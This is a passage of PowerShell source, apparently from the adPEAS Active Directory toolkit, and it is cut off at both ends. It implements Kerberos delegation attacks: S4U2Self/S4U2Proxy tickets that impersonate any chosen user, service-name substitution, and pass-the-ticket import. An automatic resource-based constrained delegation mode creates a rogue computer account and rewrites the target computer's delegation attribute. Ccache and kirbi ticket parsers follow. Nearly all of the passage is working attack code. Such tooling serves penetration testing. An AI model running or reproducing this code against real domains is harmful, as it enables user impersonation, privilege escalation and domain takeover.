	            UserName         = $ServiceAccount
	            Domain           = $Domain
	            DomainController = $Server
	        }
	        if ($ServiceCredential) { $authParams['Credential'] = $ServiceCredential }
	        elseif ($ServicePassword) { $authParams['Password'] = $ServicePassword }
	        elseif ($ServiceNTHash) { $authParams['NTHash'] = $ServiceNTHash }
	        elseif ($ServiceAES256Key) { $authParams['AES256Key'] = $ServiceAES256Key }
	        elseif ($ServiceAES128Key) { $authParams['AES128Key'] = $ServiceAES128Key }
	        else {
	            throw "Service account authentication required. Provide -ServiceCredential, -ServicePassword, -ServiceNTHash, -ServiceAES256Key, or -ServiceAES128Key"
	        }
	        $tgtResult = Invoke-KerberosAuth @authParams
	        if (-not $tgtResult -or -not $tgtResult.Success) {
	            $errMsg = if ($tgtResult) { $tgtResult.Error } else { "No result returned" }
	            throw "Failed to obtain TGT for '$ServiceAccount': $errMsg"
	        }
	        $tgtServer = $tgtResult.DomainController
	        $s4u2selfResult = Request-ServiceTicket `
	            -TGT $tgtResult.TicketBytes `
	            -SessionKey $tgtResult.SessionKeyBytes `
	            -SessionKeyType $tgtResult.EncryptionType `
	            -ServicePrincipalName $ServiceAccount `
	            -Domain $Domain `
	            -DomainController $tgtServer `
	            -UserName $ServiceAccount `
	            -S4U2Self `
	            -ImpersonateUser $ImpersonateUser
	        if (-not $s4u2selfResult -or -not $s4u2selfResult.Success) {
	            $errMsg = if ($s4u2selfResult) { $s4u2selfResult.Message } else { "No result returned" }
	            throw "S4U2Self failed: $errMsg"
	        }
	        $s4u2proxyParams = @{
	            TGT                  = $tgtResult.TicketBytes
	            SessionKey           = $tgtResult.SessionKeyBytes
	            SessionKeyType       = $tgtResult.EncryptionType
	            ServicePrincipalName = $TargetSPN
	            Domain               = $Domain
	            DomainController     = $tgtServer
	            UserName             = $ServiceAccount
	            S4U2Proxy            = $true
	            AdditionalTicket     = $s4u2selfResult.TicketBytes
	            ImpersonateUser      = $ImpersonateUser
	        }
	        if ($UseRBCD) {
	            $s4u2proxyParams['ResourceBased'] = $true
	        }
	        $s4u2proxyResult = Request-ServiceTicket @s4u2proxyParams
	        if (-not $s4u2proxyResult -or -not $s4u2proxyResult.Success) {
	            $errMsg = if ($s4u2proxyResult) { $s4u2proxyResult.Message } else { "No result returned" }
	            throw "S4U2Proxy failed: $errMsg"
	        }
	        $spnParts = $TargetSPN -split '/', 2
	        $originalService = if ($spnParts.Count -ge 2) { $spnParts[0] } else { "" }
	        $targetHost = if ($spnParts.Count -ge 2) { $spnParts[1] } else { $TargetSPN }
	        $baseKrbCredParams = @{
	            Ticket         = $s4u2proxyResult.TicketBytes
	            SessionKey     = $s4u2proxyResult.SessionKey
	            SessionKeyType = $s4u2proxyResult.EncryptionType
	            Realm          = $Domain.ToUpper()
	            ClientName     = $ImpersonateUser
	            ServerName     = $TargetSPN
	        }
	        $baseKrbCred = Build-KRBCred @baseKrbCredParams
	        $alternateTickets = $null
	        $altSPNList = $null
	        $pttMessage = ""
	        if ($AlternateService -and $AlternateService.Count -gt 0) {
	            $alternateTickets = @()
	            foreach ($altSvc in $AlternateService) {
	                $newSPN = "$altSvc/$targetHost"
	                try {
	                    $altKrbCredParams = @{
	                        Ticket         = $s4u2proxyResult.TicketBytes
	                        SessionKey     = $s4u2proxyResult.SessionKey
	                        SessionKeyType = $s4u2proxyResult.EncryptionType
	                        Realm          = $Domain.ToUpper()
	                        ClientName     = $ImpersonateUser
	                        ServerName     = $newSPN
	                    }
	                    $altKrbCred = Build-KRBCred @altKrbCredParams
	                    $altTicketObj = [PSCustomObject]@{
	                        SPN         = $newSPN
	                        TicketBytes = $altKrbCred
	                        Imported    = $false
	                    }
	                    if ($PTT) {
	                        $pttResult = Import-KerberosTicket -TicketBytes $altKrbCred
	                        if ($pttResult -and $pttResult.Success) {
	                            $altTicketObj.Imported = $true
	                        } else {
	                            Write-Warning "[!] Failed to import alternate ticket for $newSPN"
	                        }
	                    }
	                    $alternateTickets += $altTicketObj
	                }
	                catch {
	                    $errMsg = $_.Exception.Message
	                    Write-Warning "[!] SPN substitution failed for ${newSPN}: $errMsg"
	                }
	            }
	            $importedCount = @($alternateTickets | Where-Object { $_.Imported }).Count
	            if (-not $PTT) {
	                $pttMessage = " ($($AlternateService.Count) alternate ticket(s) - use -PTT to import)"
	            } elseif ($importedCount -eq $AlternateService.Count) {
	                $pttMessage = " ($importedCount alternate ticket(s) imported)"
	            } else {
	                $pttMessage = " ($importedCount/$($AlternateService.Count) alternate ticket(s) imported)"
	            }
	            $altSPNList = ($AlternateService | ForEach-Object { "$_/$targetHost" }) -join ', '
	        }
	        else {
	            if ($PTT) {
	                $pttResult = Import-KerberosTicket -TicketBytes $baseKrbCred
	                if ($pttResult -and $pttResult.Success) {
	                    $pttMessage = " (ticket imported)"
	                } else {
	                    $pttMessage = " (PTT failed - ticket available in result)"
	                    Write-Warning "[!] PTT failed, ticket available in result object"
	                }
	            } else {
	                $pttMessage = " (ticket not imported - use -PTT to import)"
	            }
	        }
	        if ($OutputKirbi) {
	            try {
	                [System.IO.File]::WriteAllBytes($OutputKirbi, $baseKrbCred)
	            }
	            catch {
	                Write-Warning "[!] Failed to export .kirbi: $($_.Exception.Message)"
	            }
	        }
	        $delegationType = if ($UseRBCD) { "RBCD" } else { "Classic Constrained Delegation" }
	        $result = [PSCustomObject]@{
	            PSTypeName          = 'adPEAS.S4U.Result'
	            Success             = $true
	            DelegationType      = $delegationType
	            ServiceAccount      = $ServiceAccount
	            ImpersonateUser     = $ImpersonateUser
	            TargetSPN           = $TargetSPN
	            Domain              = $Domain
	            DomainController    = $tgtServer
	            TicketBytes         = $baseKrbCred
	            Imported            = ($PTT -and -not $AlternateService)
	            Message             = "S4U attack successful$pttMessage"
	        }
	        if ($alternateTickets) {
	            $result | Add-Member -NotePropertyName 'AlternateService' -NotePropertyValue $AlternateService
	            $result | Add-Member -NotePropertyName 'AlternateTickets' -NotePropertyValue $alternateTickets
	            $result | Add-Member -NotePropertyName 'AlternateSPNs' -NotePropertyValue $altSPNList
	        }
	        if ($OutputKirbi) {
	            $result | Add-Member -NotePropertyName 'KirbiFile' -NotePropertyValue $OutputKirbi
	        }
	        return $result
	    }
	    catch {
	        return [PSCustomObject]@{
	            PSTypeName      = 'adPEAS.S4U.Result'
	            Success         = $false
	            ServiceAccount  = $ServiceAccount
	            ImpersonateUser = $ImpersonateUser
	            TargetSPN       = $TargetSPN
	            Domain          = $Domain
	            Message         = "S4U attack failed"
	            Error           = $_.Exception.Message
	        }
	    }
	}
}
function Invoke-ConstrainedDelegation {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$ServiceAccount,
	    [Parameter(Mandatory=$true)]
	    [string]$ImpersonateUser,
	    [Parameter(Mandatory=$true)]
	    [string]$TargetSPN,
	    [Parameter(Mandatory=$true)]
	    [string]$Domain,
	    [Parameter(Mandatory=$false)]
	    [string]$Server,
	    [Parameter(Mandatory=$false, ParameterSetName='Credential')]
	    [System.Management.Automation.PSCredential]$ServiceCredential,
	    [Parameter(Mandatory=$false, ParameterSetName='Password')]
	    [string]$ServicePassword,
	    [Parameter(Mandatory=$false, ParameterSetName='NTHash')]
	    [string]$ServiceNTHash,
	    [Parameter(Mandatory=$false, ParameterSetName='AES256')]
	    [string]$ServiceAES256Key,
	    [Parameter(Mandatory=$false, ParameterSetName='AES128')]
	    [string]$ServiceAES128Key,
	    [Parameter(Mandatory=$false)]
	    [switch]$PTT,
	    [Parameter(Mandatory=$false)]
	    [string]$OutputKirbi,
	    [Parameter(Mandatory=$false)]
	    [string[]]$AlternateService
	)
	begin {
	}
	process {
	    $coreParams = @{
	        ServiceAccount  = $ServiceAccount
	        ImpersonateUser = $ImpersonateUser
	        TargetSPN       = $TargetSPN
	        Domain          = $Domain
	        UseRBCD         = $false
	    }
	    if ($Server) { $coreParams['Server'] = $Server }
	    if ($ServiceCredential) { $coreParams['ServiceCredential'] = $ServiceCredential }
	    if ($ServicePassword) { $coreParams['ServicePassword'] = $ServicePassword }
	    if ($ServiceNTHash) { $coreParams['ServiceNTHash'] = $ServiceNTHash }
	    if ($ServiceAES256Key) { $coreParams['ServiceAES256Key'] = $ServiceAES256Key }
	    if ($ServiceAES128Key) { $coreParams['ServiceAES128Key'] = $ServiceAES128Key }
	    if ($PTT) { $coreParams['PTT'] = $true }
	    if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
	    if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }
	    return Invoke-S4UCore @coreParams
	}
}
function Invoke-RBCD {
	[CmdletBinding(DefaultParameterSetName='Auto')]
	param(
	    [Parameter(Mandatory=$true, ParameterSetName='Auto')]
	    [string]$TargetComputer,
	    [Parameter(Mandatory=$true, ParameterSetName='Manual-Credential')]
	    [Parameter(Mandatory=$true, ParameterSetName='Manual-Password')]
	    [Parameter(Mandatory=$true, ParameterSetName='Manual-NTHash')]
	    [Parameter(Mandatory=$true, ParameterSetName='Manual-AES256')]
	    [Parameter(Mandatory=$true, ParameterSetName='Manual-AES128')]
	    [string]$ServiceAccount,
	    [Parameter(Mandatory=$true)]
	    [string]$ImpersonateUser,
	    [Parameter(Mandatory=$true)]
	    [string]$TargetSPN,
	    [Parameter(Mandatory=$false)]
	    [string]$Domain,
	    [Parameter(Mandatory=$false)]
	    [string]$Server,
	    [Parameter(Mandatory=$true, ParameterSetName='Manual-Credential')]
	    [System.Management.Automation.PSCredential]$ServiceCredential,
	    [Parameter(Mandatory=$true, ParameterSetName='Manual-Password')]
	    [string]$ServicePassword,
	    [Parameter(Mandatory=$true, ParameterSetName='Manual-NTHash')]
	    [string]$ServiceNTHash,
	    [Parameter(Mandatory=$true, ParameterSetName='Manual-AES256')]
	    [string]$ServiceAES256Key,
	    [Parameter(Mandatory=$true, ParameterSetName='Manual-AES128')]
	    [string]$ServiceAES128Key,
	    [Parameter(Mandatory=$false)]
	    [switch]$PTT,
	    [Parameter(Mandatory=$false)]
	    [string]$OutputKirbi,
	    [Parameter(Mandatory=$false)]
	    [string[]]$AlternateService
	)
	begin {
	    $isAutoMode = $PSCmdlet.ParameterSetName -eq 'Auto'
	    $modeText = if ($isAutoMode) { 'Auto' } else { 'Manual' }
	}
	process {
	    try {
	        if (-not $Domain) {
	            if (-not (Ensure-LDAPConnection)) {
	                throw "No LDAP session active and -Domain not specified. Use Connect-adPEAS first or specify -Domain parameter."
	            }
	            $Domain = $Script:LDAPContext.Domain
	        }
	        if ($isAutoMode) {
	            if (-not (Ensure-LDAPConnection)) {
	                throw "Auto Mode requires an active LDAP session. Use Connect-adPEAS first."
	            }
	            $connectionParams = @{}
	            if ($Domain) { $connectionParams['Domain'] = $Domain }
	            if ($Server) { $connectionParams['Server'] = $Server }
	            $targetComputerNormalized = if ($TargetComputer.EndsWith('$')) {
	                $TargetComputer
	            } else {
	                "$TargetComputer`$"
	            }
	            $newComputerName = "RBCD-$(Get-Random -Minimum 1000 -Maximum 9999)"
	            $newComputerPassword = New-SafePassword -Length 32
	            $createResult = New-DomainComputer -ComputerName $newComputerName -Password $newComputerPassword @connectionParams
	            if (-not $createResult -or -not $createResult.Success) {
	                $errMsg = if ($createResult) { $createResult.Error } else { "No result returned" }
	                throw "Failed to create computer account: $errMsg"
	            }
	            $newComputerSamAccountName = $createResult.SamAccountName
	            $newComputerDN = $createResult.DistinguishedName
	            $newComputerObj = Get-DomainComputer -Identity $newComputerSamAccountName @connectionParams
	            if (-not $newComputerObj -or -not $newComputerObj.objectSid) {
	                throw "Failed to retrieve SID for newly created computer '$newComputerSamAccountName'"
	            }
	            $newComputerSID = $newComputerObj.objectSid
	            $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
	            $identity = New-Object System.Security.Principal.SecurityIdentifier($newComputerSID)
	            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
	                $identity,
	                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
	                [System.Security.AccessControl.AccessControlType]::Allow
	            )
	            $sd.AddAccessRule($ace)
	            $sdBytes = $sd.GetSecurityDescriptorBinaryForm()
	            $setResult = Set-DomainComputer -Identity $targetComputerNormalized -msDS_AllowedToActOnBehalfOfOtherIdentity $sdBytes @connectionParams
	            if (-not $setResult -or -not $setResult.Success) {
	                Write-Warning "[!] Failed to configure RBCD delegation, cleaning up computer account"
	                try {
	                    Remove-DomainObject -Identity $newComputerDN @connectionParams -ErrorAction SilentlyContinue
	                } catch {
	                    Write-Warning "[!] Cleanup failed: $($_.Exception.Message)"
	                }
	                $errMsg = if ($setResult) { $setResult.Error } else { "No result returned" }
	                throw "Failed to configure RBCD delegation: $errMsg"
	            }
	            $coreParams = @{
	                ServiceAccount  = $newComputerSamAccountName
	                ServicePassword = $newComputerPassword
	                ImpersonateUser = $ImpersonateUser
	                TargetSPN       = $TargetSPN
	                Domain          = $Domain
	                UseRBCD         = $true
	            }
	            if ($Server) { $coreParams['Server'] = $Server }
	            if ($PTT) { $coreParams['PTT'] = $true }
	            if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
	            if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }
	            $s4uResult = Invoke-S4UCore @coreParams
	            if ($s4uResult) {
	                $s4uResult | Add-Member -NotePropertyName 'Mode' -NotePropertyValue 'Auto' -Force
	                $s4uResult | Add-Member -NotePropertyName 'ComputerCreated' -NotePropertyValue $newComputerName -Force
	                $s4uResult | Add-Member -NotePropertyName 'ComputerDN' -NotePropertyValue $newComputerDN -Force
	                $s4uResult | Add-Member -NotePropertyName 'TargetComputer' -NotePropertyValue $targetComputerNormalized -Force
	            }
	            return $s4uResult
	        }
	        else {
	            $coreParams = @{
	                ServiceAccount  = $ServiceAccount
	                ImpersonateUser = $ImpersonateUser
	                TargetSPN       = $TargetSPN
	                Domain          = $Domain
	                UseRBCD         = $true
	            }
	            if ($Server) { $coreParams['Server'] = $Server }
	            if ($ServiceCredential) { $coreParams['ServiceCredential'] = $ServiceCredential }
	            if ($ServicePassword) { $coreParams['ServicePassword'] = $ServicePassword }
	            if ($ServiceNTHash) { $coreParams['ServiceNTHash'] = $ServiceNTHash }
	            if ($ServiceAES256Key) { $coreParams['ServiceAES256Key'] = $ServiceAES256Key }
	            if ($ServiceAES128Key) { $coreParams['ServiceAES128Key'] = $ServiceAES128Key }
	            if ($PTT) { $coreParams['PTT'] = $true }
	            if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
	            if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }
	            $s4uResult = Invoke-S4UCore @coreParams
	            if ($s4uResult) {
	                $s4uResult | Add-Member -NotePropertyName 'Mode' -NotePropertyValue 'Manual' -Force
	            }
	            return $s4uResult
	        }
	    }
	    catch {
	        $errorResult = [PSCustomObject]@{
	            PSTypeName      = 'adPEAS.S4U.Result'
	            Success         = $false
	            DelegationType  = "RBCD"
	            Mode            = if ($isAutoMode) { "Auto" } else { "Manual" }
	            ImpersonateUser = $ImpersonateUser
	            TargetSPN       = $TargetSPN
	            Domain          = $Domain
	            Message         = "RBCD attack failed"
	            Error           = $_.Exception.Message
	        }
	        if ($isAutoMode -and $newComputerName) {
	            $errorResult | Add-Member -NotePropertyName 'ComputerCreated' -NotePropertyValue $newComputerName
	        }
	        if ($ServiceAccount) {
	            $errorResult | Add-Member -NotePropertyName 'ServiceAccount' -NotePropertyValue $ServiceAccount
	        }
	        return $errorResult
	    }
	}
}
function Import-KerberosTicket {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$false)]
	    [byte[]]$TicketBytes,
	    [Parameter(Mandatory=$false)]
	    [string]$TicketBase64,
	    [Parameter(Mandatory=$false)]
	    [string]$Kirbi,
	    [Parameter(Mandatory=$false)]
	    [string]$Ccache,
	    [Parameter(Mandatory=$false)]
	    [byte[]]$SessionKey,
	    [Parameter(Mandatory=$false)]
	    [int]$SessionKeyType = 18,
	    [Parameter(Mandatory=$false)]
	    [UInt64]$LUID = 0,
	    [Parameter(Mandatory=$false)]
	    [string]$Realm,
	    [Parameter(Mandatory=$false)]
	    [string]$ClientName,
	    [Parameter(Mandatory=$false)]
	    [string]$ServerName,
	    [Parameter(Mandatory=$false)]
	    [string]$ServerInstance,
	    [Parameter(Mandatory=$false)]
	    [datetime]$AuthTime,
	    [Parameter(Mandatory=$false)]
	    [datetime]$StartTime,
	    [Parameter(Mandatory=$false)]
	    [datetime]$EndTime,
	    [Parameter(Mandatory=$false)]
	    [datetime]$RenewTill,
	    [Parameter(Mandatory=$false)]
	    [byte[]]$TicketFlags
	)
	begin {
	    $Script:KirbiMetadata = $null
	    $Script:CcacheMetadata = $null
	    function Parse-CcacheBytes {
	        param(
	            [byte[]]$Bytes
	        )
	        $bytes = $Bytes
	        $offset = 0
	        function Read-UInt16BE {
	            param([int]$pos)
	            if ($pos + 2 -gt $bytes.Length) {
	                throw "ccache: Read-UInt16BE out of bounds at position $pos"
	            }
	            return ([uint16]$bytes[$pos] -shl 8) -bor $bytes[$pos + 1]
	        }
	        function Read-UInt32BE {
	            param([int]$pos)
	            if ($pos + 4 -gt $bytes.Length) {
	                throw "ccache: Read-UInt32BE out of bounds at position $pos"
	            }
	            return ([uint32]$bytes[$pos] -shl 24) -bor `
	                   ([uint32]$bytes[$pos + 1] -shl 16) -bor `
	                   ([uint32]$bytes[$pos + 2] -shl 8) -bor `
	                   $bytes[$pos + 3]
	        }
	        function Read-Data {
	            param([int]$pos)
	            $len = Read-UInt32BE -pos $pos
	            if ($pos + 4 + $len -gt $bytes.Length) {
	                throw "ccache: Read-Data length $len extends beyond data at position $pos"
	            }
	            $data = if ($len -gt 0) { $bytes[($pos + 4)..($pos + 3 + $len)] } else { @() }
	            return @{
	                Length = $len
	                Data = $data
	                NextPos = $pos + 4 + $len
	            }
	        }
	        function Read-Principal {
	            param([int]$pos, [int]$version)
	            $result = @{
	                NameType = 0
	                Components = @()
	                Realm = ""
	                NextPos = $pos
	            }
	            $result.NameType = Read-UInt32BE -pos $pos
	            $pos += 4
	            $compCount = Read-UInt32BE -pos $pos
	            $pos += 4
	            if ($version -ge 4) {
	                $realmData = Read-Data -pos $pos
	                $result.Realm = [System.Text.Encoding]::ASCII.GetString($realmData.Data)
	                $pos = $realmData.NextPos
	            }
	            for ($i = 0; $i -lt $compCount; $i++) {
	                $compData = Read-Data -pos $pos
	                $result.Components += [System.Text.Encoding]::ASCII.GetString($compData.Data)
	                $pos = $compData.NextPos
	            }
	            if ($version -lt 4) {
	                $realmData = Read-Data -pos $pos
	                $result.Realm = [System.Text.Encoding]::ASCII.GetString($realmData.Data)
	                $pos = $realmData.NextPos
	            }
	            $result.NextPos = $pos
	            return $result
	        }
	        $version = Read-UInt16BE -pos 0
	        $offset = 2
	        $versionNum = $version -band 0x00FF
	        if ($versionNum -lt 3 -or $versionNum -gt 4) {
	            if ($versionNum -eq 1 -or $versionNum -eq 2) {
	                throw "Ccache version $versionNum is not supported (legacy MIT Kerberos format from pre-2000). Please use a modern tool like 'kcc' or 'ticketConverter.py' to convert to version 4 format."
	            }
	            throw "Unsupported ccache version: $versionNum (0x$($version.ToString('X4'))). Only version 3 and 4 are supported."
	        }
	        if ($versionNum -eq 4) {
	            $headerLen = Read-UInt16BE -pos $offset
	            $offset += 2 + $headerLen
	        }
	        $defaultPrinc = Read-Principal -pos $offset -version $versionNum
	        $offset = $defaultPrinc.NextPos
	        $credentials = @()
	        while ($offset -lt $bytes.Length) {
	            try {
	                $cred = @{}
	                $client = Read-Principal -pos $offset -version $versionNum
	                $cred.ClientRealm = $client.Realm
	                $cred.ClientName = $client.Components -join '/'
	                $offset = $client.NextPos
	                $server = Read-Principal -pos $offset -version $versionNum
	                $cred.ServerRealm = $server.Realm
	                $cred.ServerName = $server.Components -join '/'
	                $offset = $server.NextPos
	                $keyType = Read-UInt16BE -pos $offset
	                $offset += 2
	                if ($versionNum -eq 3) {
	                    $offset += 2  # padding in v3
	                }
	                $keyData = Read-Data -pos $offset
	                $cred.KeyType = $keyType
	                $cred.SessionKey = $keyData.Data
	                $offset = $keyData.NextPos
	                $cred.AuthTime = Read-UInt32BE -pos $offset
	                $offset += 4
	                $cred.StartTime = Read-UInt32BE -pos $offset
	                $offset += 4
	                $cred.EndTime = Read-UInt32BE -pos $offset
	                $offset += 4
	                $cred.RenewTill = Read-UInt32BE -pos $offset
	                $offset += 4
	                $offset += 1
	                $cred.TicketFlags = Read-UInt32BE -pos $offset
	                $offset += 4
	                $addrCount = Read-UInt32BE -pos $offset
	                $offset += 4
	                for ($i = 0; $i -lt $addrCount; $i++) {
	                    $null = Read-UInt16BE -pos $offset  # addrType - skip
	                    $offset += 2
	                    $addrData = Read-Data -pos $offset
	                    $offset = $addrData.NextPos
	                }
	                $authCount = Read-UInt32BE -pos $offset
	                $offset += 4
	                for ($i = 0; $i -lt $authCount; $i++) {
	                    $null = Read-UInt16BE -pos $offset  # authType - skip
	                    $offset += 2
	                    $authData = Read-Data -pos $offset
	                    $offset = $authData.NextPos
	                }
	                $ticketData = Read-Data -pos $offset
	                $cred.Ticket = $ticketData.Data
	                $offset = $ticketData.NextPos
	                $secondTicketData = Read-Data -pos $offset
	                $offset = $secondTicketData.NextPos
	                $credentials += $cred
	            }
	            catch {
	                break
	            }
	        }
	        if ($credentials.Count -eq 0) {
	            throw "No credentials found in ccache file"
	        }
	        $tgt = $credentials | Where-Object { $_.ServerName -match '^krbtgt/' } | Select-Object -First 1
	        if (-not $tgt) {
	            $tgt = $credentials[0]
	        }
	        $unixEpoch = [DateTime]::new(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)
	        $AuthTime = if ($tgt.AuthTime -gt 0) { $unixEpoch.AddSeconds($tgt.AuthTime) } else { $null }
	        $StartTime = if ($tgt.StartTime -gt 0) { $unixEpoch.AddSeconds($tgt.StartTime) } else { $null }
	        $EndTime = if ($tgt.EndTime -gt 0) { $unixEpoch.AddSeconds($tgt.EndTime) } else { $null }
	        $RenewTill = if ($tgt.RenewTill -gt 0) { $unixEpoch.AddSeconds($tgt.RenewTill) } else { $null }
	        return @{
	            Ticket = $tgt.Ticket
	            SessionKey = $tgt.SessionKey
	            SessionKeyType = $tgt.KeyType
	            ClientName = $tgt.ClientName
	            ClientRealm = $tgt.ClientRealm
	            ServerName = $tgt.ServerName
	            ServerRealm = $tgt.ServerRealm
	            AuthTime = $AuthTime
	            StartTime = $StartTime
	            EndTime = $EndTime
	            RenewTill = $RenewTill
	        }
	    }
	    function Parse-KrbCredFile {
	        param(
	            [byte[]]$Data
	        )
	        $result = @{
	            ClientName = $null
	            ClientRealm = $null
	            ServerName = $null
	            ServerRealm = $null
	            EncryptionType = $null
	            AuthTime = $null
	            StartTime = $null
	            EndTime = $null
	            RenewTill = $null
	        }
	        try {
	            function Read-ASN1Length {
	                param([byte[]]$bytes, [int]$offset)
	                if ($offset -ge $bytes.Length) { return @{ Length = 0; BytesConsumed = 0 } }
	                $len = $bytes[$offset]
	                if ($len -lt 128) {
	                    return @{ Length = $len; BytesConsumed = 1 }
	                }
	                $numBytes = $len -band 0x7F
	                $len = 0
	                for ($i = 0; $i -lt $numBytes; $i++) {
	                    if (($offset + 1 + $i) -ge $bytes.Length) { break }
	                    $len = ($len -shl 8) -bor $bytes[$offset + 1 + $i]
	                }
	                return @{ Length = $len; BytesConsumed = 1 + $numBytes }
	            }
	            function Read-GeneralString {
	                param([byte[]]$bytes, [int]$offset, [int]$length)
	                if (($offset + $length) -gt $bytes.Length) { return "" }
	                return [System.Text.Encoding]::ASCII.GetString($bytes, $offset, $length)
	            }
	            function Read-ASN1Integer {
	                param([byte[]]$bytes, [int]$offset)
	                if ($offset -ge $bytes.Length -or $bytes[$offset] -ne 0x02) { return @{ Value = 0; NextPos = $offset } }
	                $offset++
	                $lenInfo = Read-ASN1Length -bytes $bytes -offset $offset
	                $offset += $lenInfo.BytesConsumed
	                $value = 0
	                for ($i = 0; $i -lt $lenInfo.Length; $i++) {
	                    if (($offset + $i) -ge $bytes.Length) { break }
	                    $value = ($value -shl 8) -bor $bytes[$offset + $i]
	                }
	                return @{ Value = $value; NextPos = $offset + $lenInfo.Length }
	            }
	            function Read-KerberosTime {
	                param([byte[]]$bytes, [int]$offset)
	                if ($offset -ge $bytes.Length -or $bytes[$offset] -ne 0x18) { return $null }
	                $offset++
	                $lenInfo = Read-ASN1Length -bytes $bytes -offset $offset
	                $offset += $lenInfo.BytesConsumed
	                if ($lenInfo.Length -lt 15) { return $null }
	                $timeStr = [System.Text.Encoding]::ASCII.GetString($bytes, $offset, $lenInfo.Length)
	                try {
	                    return [DateTime]::ParseExact($timeStr, "yyyyMMddHHmmssZ", [System.Globalization.CultureInfo]::InvariantCulture, [System.Globalization.DateTimeStyles]::AssumeUniversal)
	                } catch {
	                    return $null
	                }
	            }
	            $pos = 0
	            if ($Data[$pos] -ne 0x76) {
	                return $result
	            }
	            $pos++
	            $lenInfo = Read-ASN1Length -bytes $Data -offset $pos
	            $pos += $lenInfo.BytesConsumed
	            if ($Data[$pos] -ne 0x30) { return $result }
	            $pos++
	            $lenInfo = Read-ASN1Length -bytes $Data -offset $pos
	            $pos += $lenInfo.BytesConsumed
	            $krbCredSeqEnd = $pos + $lenInfo.Length
	            while ($pos -lt $krbCredSeqEnd -and $pos -lt $Data.Length) {
	                if ($pos -ge $Data.Length) { break }
	                $tag = $Data[$pos]
	                if ($tag -lt 0xA0 -or $tag -gt 0xA3) {
	                    $pos++
	                    continue
	                }
	                $pos++
	                if ($pos -ge $Data.Length) { break }
	                $lenInfo = Read-ASN1Length -bytes $Data -offset $pos
	                $pos += $lenInfo.BytesConsumed
	                $elemLen = $lenInfo.Length
	                $elemStart = $pos
	                if ($tag -eq 0xA2) {
	                    if ($Data[$elemStart] -eq 0x30) {
	                        $ticketsSeqPos = $elemStart + 1
	                        $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketsSeqPos
	                        $ticketsSeqPos += $lenInfo.BytesConsumed
	                        if ($Data[$ticketsSeqPos] -eq 0x61) {
	                            $ticketPos = $ticketsSeqPos + 1
	                            $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketPos
	                            $ticketPos += $lenInfo.BytesConsumed
	                            if ($Data[$ticketPos] -eq 0x30) {
	                                $ticketPos++
	                                $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketPos
	                                $ticketPos += $lenInfo.BytesConsumed
	                                $ticketSeqEnd = $ticketPos + $lenInfo.Length
	                                while ($ticketPos -lt $ticketSeqEnd -and $ticketPos -lt $Data.Length) {
	                                    $ticketTag = $Data[$ticketPos]
	                                    $ticketPos++
	                                    if ($ticketPos -ge $Data.Length) { break }
	                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketPos
	                                    $ticketPos += $lenInfo.BytesConsumed
	                                    $ticketElemLen = $lenInfo.Length
	                                    $ticketElemStart = $ticketPos
	                                    if ($ticketTag -eq 0xA1) {
	                                        if ($Data[$ticketElemStart] -eq 0x1B) {
	                                            $realmPos = $ticketElemStart + 1
	                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $realmPos
	                                            $realmPos += $lenInfo.BytesConsumed
	                                            $result.ServerRealm = Read-GeneralString -bytes $Data -offset $realmPos -length $lenInfo.Length
	                                            $result.ClientRealm = $result.ServerRealm
	                                        }
	                                    }
	                                    if ($ticketTag -eq 0xA2) {
	                                        if ($Data[$ticketElemStart] -eq 0x30) {
	                                            $snamePos = $ticketElemStart + 1
	                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
	                                            $snamePos += $lenInfo.BytesConsumed
	                                            $snameEnd = $snamePos + $lenInfo.Length
	                                            while ($snamePos -lt $snameEnd -and $snamePos -lt $Data.Length) {
	                                                if ($Data[$snamePos] -eq 0xA1) {
	                                                    $snamePos++
	                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
	                                                    $snamePos += $lenInfo.BytesConsumed
	                                                    if ($Data[$snamePos] -eq 0x30) {
	                                                        $snamePos++
	                                                        $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
	                                                        $snamePos += $lenInfo.BytesConsumed
	                                                        $nameComponents = @()
	                                                        $nameSeqEnd = $snamePos + $lenInfo.Length
	                                                        while ($snamePos -lt $nameSeqEnd -and $snamePos -lt $Data.Length) {
	                                                            if ($Data[$snamePos] -eq 0x1B) {
	                                                                $snamePos++
	                                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
	                                                                $snamePos += $lenInfo.BytesConsumed
	                                                                $nameComponents += Read-GeneralString -bytes $Data -offset $snamePos -length $lenInfo.Length
	                                                                $snamePos += $lenInfo.Length
	                                                            } else {
	                                                                $snamePos++
	                                                            }
	                                                        }
	                                                        $result.ServerName = $nameComponents -join '/'
	                                                    }
	                                                    break
	                                                }
	                                                $snamePos++
	                                            }
	                                        }
	                                    }
	                                    if ($ticketTag -eq 0xA3) {
	                                        if ($Data[$ticketElemStart] -eq 0x30) {
	                                            $encPos = $ticketElemStart + 1
	                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $encPos
	                                            $encPos += $lenInfo.BytesConsumed
	                                            if ($Data[$encPos] -eq 0xA0) {
	                                                $encPos++
	                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $encPos
	                                                $encPos += $lenInfo.BytesConsumed
	                                                $intResult = Read-ASN1Integer -bytes $Data -offset $encPos
	                                                $result.EncryptionType = $intResult.Value
	                                            }
	                                        }
	                                    }
	                                    $ticketPos = $ticketElemStart + $ticketElemLen
	                                }
	                            }
	                        }
	                    }
	                }
	                if ($tag -eq 0xA3) {
	                    if ($Data[$elemStart] -eq 0x30) {
	                        $encDataPos = $elemStart + 1
